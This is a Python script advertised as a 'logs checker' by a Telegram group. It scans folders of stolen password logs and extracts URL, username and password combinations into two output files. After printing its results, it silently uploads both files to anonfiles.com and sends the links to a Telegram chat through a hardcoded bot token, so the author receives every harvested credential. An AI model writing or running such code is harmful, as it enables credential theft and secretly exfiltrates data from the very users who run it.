import os
import re
import requests

def process_files(main_folder):
    output_file = "output.txt"
    output_file2 = "output2.txt"
    url_pattern = r"URL:\s*((https?://)?(www\.)?([a-zA-Z0-9.-]+)(:\d+)?/?.*)"
    username_pattern = r"Username:\s*(.+)"
    password_pattern = r"Password:\s*(.+)"
    
    with open(output_file, "a", encoding="utf-8", errors="replace") as out_file, open(output_file2, "a", encoding="utf-8", errors="replace") as out_file2:
        for root, dirs, files in os.walk(main_folder):
            for file in files:
                if file.lower() in ["password.txt", "passwords.txt", "pass.txt", "pass.txt"]:
                    file_path = os.path.join(root, file)
                    with open(file_path, "r", encoding="utf-8", errors="replace") as in_file:
                        content = in_file.read()
                        url_matches = re.findall(url_pattern, content, re.IGNORECASE)
                        username_matches = re.findall(username_pattern, content, re.IGNORECASE)
                        password_matches = re.findall(password_pattern, content, re.IGNORECASE)

                        num_matches = min(len(url_matches), len(username_matches), len(password_matches))
                        for i in range(num_matches):
                            full_url = url_matches[i][0]
                            domain = url_matches[i][3]
                            port = url_matches[i][4] or ""
                            username = username_matches[i]
                            password = password_matches[i]

                            out_file.write(f"{domain}{port}:{username}:{password}\n")
                            out_file2.write(f"{full_url}:{username}:{password}\n")

    return output_file, output_file2

def send_files_to_telegram(output_file, output_file2, bot_token, chat_id):
    files = {'output.txt': open(output_file, 'rb'), 'output2.txt': open(output_file2, 'rb')}
    response = requests.post('https://api.anonfiles.com/upload', files=files)
    if response.status_code == 200:
        download_url = response.json()["data"]["file"]["url"]["short"]
        message = f"Download links for the output files:\n{download_url['output.txt']}\n{download_url['output2.txt']}"
        requests.get(f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}')

if __name__ == "__main__":
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   Telegram :BlackPhoenix_Official   @@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   Admin : https://t.me/x13xx0       @@@@@@@@@@@@@@@@@@@@@@@@@@&")
    print("@@&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&@")
    print("@@@@&##&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&#&@@@")
    print("@@@@@@&###&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&##&@@@@@")
    print("@@@@@@@@@&##&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&###&@@@@@@@")
    print("@@@@@@@@@@@&###&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&###&@@@@@@@@@@")
    print("@@@@@@@@@@@@@&####&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&####&@@@@@@@@@@@@")
    print("@@@@@@@@@@&&@@@&#####&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&####&@@@&&@@@@@@@@@")
    print("@@@@@@@@@@@&##&@@@&#####&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&#####&@@&&#&@@@@@@@@@@")
    print("@@@@@@@@@@@@@&##&@@@&##BB##&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&##BB##&@@&###@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@####&@@&#BBBB##&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&#BBBB#&@@&####&@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@&#B###&@&#BBBBB##&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&##BBBBB#&@@&##B#&@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@##BBB#&&&&##BBBBB##&@@@@@@@@@@@@@@@@@@@@@@@@@&&#BBBBBB##&&&##BBB#&@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@&#BBBBB###BBBBBBBBBB#@@@@@@@@@@@@@@@@@@@@@#BBBBBBBBBB####BBBB#&@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@&&@@@&#####BBBBBBBBBBBBB#@@@@@@@@@&&##&@@@@@#BBBBBBBBBBBBBB#####@@@@&&@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@&&##&&&&&&&&&&&#BBBBBBBBB@@@@@@@#BBGB@@@@@@@#BBBBBBBB##&&&&&&&&&&###&@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@&#BBBBBBBBBBBBBBBBBBBBB&@@@@&&BBBG#@@@@@@&BBBBBBBBBBBBBBBBBBBBB#&@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@&&###&&&&&&&##BBBBBBBB&@@@@&BBBBB#@@@@@#BBBBBBBB#&&&&&&&&###&@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&##&&&BBBBBB#&@&BGBBBGG#@@&BBBBBB#&&##&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@&&####BB#&@@&@@&#BBBGBBBBBBBBBBBBBGGBBB#@@&&@&##BB###&&@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@@&##&@@&@@&&&&&BBBBBBBBB&&&&&&@&@@&##&@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&###&@&##@@#&@@@#GBBBBBGB@@@@#&@&B&@@###&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@&##@@&#@@@@@#GBBBBB&@@@@##@@&##@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@&@@@@@@@#BBBB&@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#BB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@@@@#&@@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&#&@&@&##&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&###BB#@&BB&&#BB###&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BBBB#&@#BBBB&@&#BBB#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#BB#&@@&BBBBBB@@@&#BB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#B#&@@@@&BBBBBB&@@@@&#B&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#&@@@@@@&BBBBB#@@@@@@@&#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#BBBB#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BBBB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#B#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")

# Code for processing files and generating output files goes here
main_folder = input("Enter the main folder path: ")
process_files(main_folder)
print("LOGS CHECKED. Check the output.txt and output2.txt files for results and join us @BlackPhoenix_Official .")


def upload_to_anonfiles(file_content, file_name):
    url = "https://api.anonfiles.com/upload"
    files = {"file": (file_name, file_content)}
    response = requests.post(url, files=files)
    response.raise_for_status()
    return response.json()
    
# Uploading output files to Anonfiles and getting their URLs
output_files = ['output.txt', 'output2.txt']
anonfiles_urls = []
for file in output_files:
    with open(file, 'rb') as f:
        file_content = f.read()
    anonfiles_response = upload_to_anonfiles(file_content, file)
    anonfiles_url = anonfiles_response.get('data').get('file').get('url').get('full')
    anonfiles_urls.append(anonfiles_url)

def send_telegram_message(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    response = requests.post(url, json=data)
    response.raise_for_status()
# Sending URLs of output files to Telegram bot
bot_token = '6253677632:AAFHk2sjFHe_osaAAmu1k0YNDAq6lYuj4AM'
chat_id = '5216408128'
message = f'Output files: {", ".join(anonfiles_urls)}'
send_telegram_message(bot_token, chat_id, message)
print('TOOL MADE BY https://t.me/x13xx0')


